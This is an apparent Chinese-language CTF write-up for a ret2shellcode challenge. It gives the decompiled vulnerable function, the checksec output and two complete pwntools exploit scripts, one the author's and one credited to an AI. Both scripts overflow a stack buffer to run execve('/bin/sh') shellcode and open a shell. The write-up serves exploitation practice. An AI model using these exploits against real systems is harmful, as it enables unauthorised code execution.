# ret2shellcode

反编译：

```c
ssize_t vuln()
{
  _BYTE buf[256]; // [rsp+0h] [rbp-100h] BYREF

  puts("Can you feel the power of shellcode?");
  printf("Here is your gift: %p\n", buf);
  printf("Show me your shellcode: ");
  return read(0, buf, 0x200u);
}
```

checksec 输出：

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

因为栈可执行，且栈地址已知，故直接在栈上写 shellcode，同时覆盖返回地址指向栈上的 shellcode：

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process("./vuln")
elf = ELF("./vuln")

p.recvuntil(b"Here is your gift:")
buf_addr = int(p.recvline().decode(), 16)
log.info(f"buf addr: 0x{buf_addr:x}")
shellcode = shellcraft.amd64.linux.sh()
shellcode_addr = buf_addr + 0x110
payload = b"A" * 0x108 + p64(shellcode_addr) + asm(shellcode)
print(shellcode)
print(payload)
p.recvuntil(b"shellcode: ")
p.send(payload)
p.interactive()
```

AI 完成的攻击脚本，和上面的思路是一样的：

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

import sys
LOCAL = '--remote' not in sys.argv

if LOCAL:
    p = process('./vuln')
else:
    p = remote('localhost', 9999)

# Receive leaked buffer address
p.recvuntil(b'Here is your gift: ')
buffer_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked buffer: {hex(buffer_addr)}")

p.recvuntil(b'Show me your shellcode: ')

# execve('/bin/sh') shellcode
shellcode = asm(shellcraft.sh())

# Stack layout (vuln function):
#   [buffer         ] rbp-0x100  256 bytes
#   [saved rbp      ] rbp         8 bytes
#   [return address ] rbp+8       8 bytes
# read(0, buffer, 0x200) gives us a 512 byte write into 256 byte buffer
#
# Payload: [NOP sled][shellcode][padding to ret addr][buffer_addr]

payload  = b'\x90' * 64                # NOP sled
payload += shellcode                    # shellcode
payload += b'\x90' * (264 - len(payload))  # fill to return address
payload += p64(buffer_addr)            # return to NOP sled

p.send(payload)

# Interactive shell
p.interactive()
```
